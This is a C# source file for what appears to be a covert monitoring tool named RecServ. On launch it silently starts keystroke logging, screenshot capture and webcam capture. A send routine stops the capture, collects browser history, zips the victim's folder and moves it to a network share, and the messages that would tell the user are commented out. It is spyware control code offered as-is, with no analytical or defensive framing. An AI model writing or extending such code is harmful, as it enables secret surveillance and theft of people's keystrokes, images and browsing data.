using RecServ.Modules;
using RecServ.Global_Classes;
using System.IO.Compression;

namespace RecServ
{
    public partial class RecServMain : Form
    {

        public RecServMain()
        {
            InitializeComponent();
            StartKeylogger startKeylogger = new StartKeylogger();

            startKeylogger.StartLogging();
        }

    }



    class StartKeylogger
    {

        private Keystrokes keystrokes;
        private FileLogger fileLogger;
        private Screenshots screenshots;
        private WebCam webCam;
        private InternetHistory internetHistory;

        private bool isKeyloggerActive = false;
        private bool isFileloggerActive = false;
        private bool isScrshotsActive = false;
        private bool isWebCamActive = false;




        private void InitilinzeAllModules()
        {

            keystrokes = new Keystrokes();
            fileLogger = new FileLogger();
            screenshots = new Screenshots();
            webCam = new WebCam();
            internetHistory = new InternetHistory();
        }



        public void StartLogging()
        {
            InitilinzeAllModules();


            #region - KeyStrokesModule
            try
            {
                keystrokes.Start();
                isKeyloggerActive = true;

                Logger.WriteLog("Keystrokes Module Started");
            }
            catch (Exception ex)
            {
                Logger.WriteLog($"Error! Keystrokes Module Failed to Start:\n {ex.Message}\n");
            }
            #endregion

            #region - FileLoggerModule
            try
            {
                //fileLogger.Start();
                isFileloggerActive = true;

                Logger.WriteLog("FileLogger Module NOT Started");
            }
            catch (Exception ex)
            {
                Logger.WriteLog($"Error! FileLogger Module Failed to Start\n {ex.Message}\n");
            }
            #endregion

            #region - ScreenshotsModule
            try
            {
                screenshots.Start();
                isScrshotsActive = true;

                Logger.WriteLog("Screenshots Module Started");
            }
            catch (Exception ex)
            {
                Logger.WriteLog($"Error! Screenshots Module Failed to Start\n {ex.Message}\n");
            }
            #endregion

            #region - WebCamModule
            try
            {
                webCam.Start();
                isWebCamActive = true;

                Logger.WriteLog("WebCam Module Started");
            }
            catch (Exception ex)
            {
                Logger.WriteLog($"Error! WebCam Module Failed to Start\n {ex.Message}\n");
            }
            #endregion

        }

        public void StopLogging()
        {
            #region - KeyStrokesModule
            try
            {
                keystrokes.Stop();
                isKeyloggerActive = false;

                Logger.WriteLog("Keystrokes Module Stopped");
            }
            catch (Exception ex)
            {
                Logger.WriteLog($"Error! Keystrokes Module Failed to Stop:\n {ex.Message}\n");
            }
            #endregion

            #region - FileLoggerModule
            try
            {
                //fileLogger.Stop();
                isFileloggerActive = false;

                Logger.WriteLog("FileLogger Module Stopped");
            }
            catch (Exception ex)
            {
                Logger.WriteLog($"Error! FileLogger Module Failed to Stop:\n {ex.Message}\n");
            }
            #endregion

            #region - ScreenshotsModule
            try
            {
                screenshots.Stop();
                isScrshotsActive = false;

                Logger.WriteLog("Screenshots Module Stopped");
            }
            catch (Exception ex)
            {
                Logger.WriteLog($"Error! Screenshots Module Failed to Stop:\n {ex.Message}\n");
            }
            #endregion

            #region - WebCamModule
            try
            {
                webCam.Stop();
                isWebCamActive = false;

                Logger.WriteLog("WebCam Module Stopped");
            }
            catch (Exception ex)
            {
                Logger.WriteLog($"Error! WebCam Module Failed to Stop:\n {ex.Message}\n");
            }
            #endregion

        }



        public void SendCollectedData()
        {
            StopLogging();

            //Gets Internet History from Browser and Stores in Database
            #region - InternetHistoryModule
            try
            {
                internetHistory.GetHistory();
                Logger.WriteLog("Browser History Successfully Fetched");
            }
            catch (Exception ex)
            {
                Logger.WriteLog($"Error! Unable to Fetch Browser History:\n{ex.Message} \n");
            }
            #endregion


            var SourceFolder = $@"{PathManager.Instance.HomeDirectory}{Environment.UserName}";

            string sourceFilePath = $@"{SourceFolder}.zip";

            string destinationFolderPath = @"\\Dell-letitude\UserData\";

            string destinationFilePath = Path.Combine(destinationFolderPath, $"{Environment.UserName}.zip");

            try
            {
                try
                {
                    ZipFile.CreateFromDirectory(SourceFolder, $"{PathManager.Instance.HomeDirectory}{Environment.UserName}.zip");

                    Logger.WriteLog("Collected Data Compressed Successfully");
                }
                catch (Exception ex)
                {
                    Logger.WriteLog($"Error! Unable to Create ZIP File:\n {ex.Message}\n");
                }

                File.Move(sourceFilePath, destinationFilePath, true);

                Logger.WriteLog("File transferred successfully");

                //MessageBox.Show("File transferred successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                //MessageBox.Show("An error occurred during the file transfer:\n" + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Logger.WriteLog($"An error occurred during the file transfer:\n {ex.Message}\n");
            }
        }

    }
}